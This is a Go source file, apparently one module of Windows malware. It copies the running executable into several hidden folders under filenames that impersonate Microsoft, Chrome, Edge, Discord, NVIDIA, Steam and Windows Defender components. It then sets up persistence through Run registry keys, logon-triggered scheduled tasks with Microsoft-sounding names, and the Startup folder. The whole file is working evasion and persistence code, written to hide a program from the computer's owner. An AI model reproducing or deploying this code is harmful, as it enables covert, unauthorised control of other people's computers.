//go:build windows

package persistance

import (
	"errors"
	"math/rand/v2"
	"os"
	"os/exec"
	"path/filepath"

	"golang.org/x/sys/windows/registry"
)

var unsuspectingPaths = []struct {
	Path     string
	Filename string
	RegKey   string
}{
	{
		Path:     filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft", "Windows", "WebCache"),
		Filename: "WebCache.exe",
		RegKey:   "WinWebCacheIndex",
	},
	{
		Path:     filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft", "CLR_v4.0", "UsageLogs"),
		Filename: "AppLaunch.exe",
		RegKey:   "CLRUsageReporter",
	},
	{
		Path:     filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default", "Cache"),
		Filename: "msedge_update.exe",
		RegKey:   "EdgeUpdateCore",
	},
	{
		Path:     filepath.Join(os.Getenv("APPDATA"), "discord", "Cache"),
		Filename: "discord_utils.exe",
		RegKey:   "DiscordWebHelper",
	},
	{
		Path:     filepath.Join(os.Getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "ShaderCache"),
		Filename: "chrome_proxy.exe",
		RegKey:   "GoogleChromeProxy",
	},
	{
		Path:     filepath.Join(os.Getenv("LOCALAPPDATA"), "NVIDIA", "DXCache"),
		Filename: "nv_telemetry.exe",
		RegKey:   "NvTelemetryContainer",
	},
	{
		Path:     filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft", "OneDrive", "logs", "Common"),
		Filename: "OneDriveStandalone.exe",
		RegKey:   "OneDriveStandaloneUpdater",
	},
	{
		Path:     filepath.Join(os.Getenv("ProgramData"), "Microsoft", "Windows Defender", "Scans", "History", "Results"),
		Filename: "MpSvcStub.exe",
		RegKey:   "WindowsDefenderHealth",
	},
	{
		Path:     filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft", "Windows", "WER", "ReportArchive"),
		Filename: "WerFaultSecure.exe",
		RegKey:   "WindowsErrorForwarder",
	},
	{
		Path:     filepath.Join(os.Getenv("LOCALAPPDATA"), "Steam", "htmlcache", "Local Storage"),
		Filename: "steam_api_helper.exe",
		RegKey:   "SteamClientService",
	},
	{
		Path:     filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft", "FontCache", "4", "CloudFonts"),
		Filename: "FntCacheWorker.exe",
		RegKey:   "FontCacheBootstrap",
	},
	{
		Path:     filepath.Join(os.Getenv("LOCALAPPDATA"), "Temp", "ghis_updates"),
		Filename: "setup_patch_x64.exe",
		RegKey:   "GhisAutoUpdate",
	},
}

func copySelf() []byte {
	self, _ := os.Executable()
	data, err := os.ReadFile(self)
	if err != nil {
		return []byte{0x00}
	} else {
		return data
	}
}

func replicate(path string, filename string, file []byte) error {
	_, err := os.Stat(path)
	if err != nil {
		err2 := os.MkdirAll(path, 0755)
		if err2 != nil {
			return errors.New("something ig bro")
		}
	}
	err = os.WriteFile(filepath.Join(path, filename), file, 0755)
	if err != nil {
		return errors.New("something ig bro")
	} else {
		return nil
	}
}

func Persist() {
	self := copySelf()
	var filepaths []int
	filepaths = append(filepaths, rand.IntN(len(unsuspectingPaths)-1))
OuterFor:
	for len(filepaths) < 5 {
		newpath := rand.IntN(len(unsuspectingPaths) - 1)
		for _, path := range filepaths {
			if newpath == path {
				continue OuterFor
			}
		}
		filepaths = append(filepaths, newpath)
	}
	for _, path := range filepaths[:4] {
		replicate(unsuspectingPaths[path].Path, unsuspectingPaths[path].Filename, self)
	}
	key, err := registry.OpenKey(registry.CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", registry.ALL_ACCESS)
	if err == nil {
		key.SetStringValue(unsuspectingPaths[filepaths[0]].RegKey, filepath.Join(unsuspectingPaths[filepaths[0]].Path, unsuspectingPaths[filepaths[0]].Filename))
		key.SetStringValue(unsuspectingPaths[filepaths[1]].RegKey, filepath.Join(unsuspectingPaths[filepaths[1]].Path, unsuspectingPaths[filepaths[1]].Filename))
		key.Close()
	}
	exec.Command("schtasks", "/create", "/f",
		"/tn", "MicrosoftLocalMachineLocalesUpdateSVC",
		"/tr", filepath.Join(unsuspectingPaths[filepaths[2]].Path, unsuspectingPaths[filepaths[2]].Filename),
		"/sc", "onlogon", "/it").Run()
	exec.Command("schtasks", "/create", "/f",
		"/tn", "MicrosoftEdgeInitializationService",
		"/tr", filepath.Join(unsuspectingPaths[filepaths[3]].Path, unsuspectingPaths[filepaths[3]].Filename),
		"/sc", "onlogon", "/it").Run()
	replicate(filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup"), unsuspectingPaths[filepaths[4]].Filename, self)
}
